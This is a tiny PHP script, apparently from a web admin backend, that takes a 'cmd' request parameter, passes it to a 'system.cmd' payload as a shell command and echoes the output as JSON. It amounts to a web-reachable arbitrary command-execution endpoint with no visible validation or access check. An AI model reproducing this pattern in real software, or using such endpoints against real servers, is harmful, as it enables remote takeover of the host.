<?php
require ("include.php");
$data = Hub::getPayload(array(
	"cmd"		=> "system.cmd",
	"shell"		=> IO::getString("cmd")
));
$data = str_replace(array("\n"),array("<br />"),$data);
echo IO::showJSres($data);
?>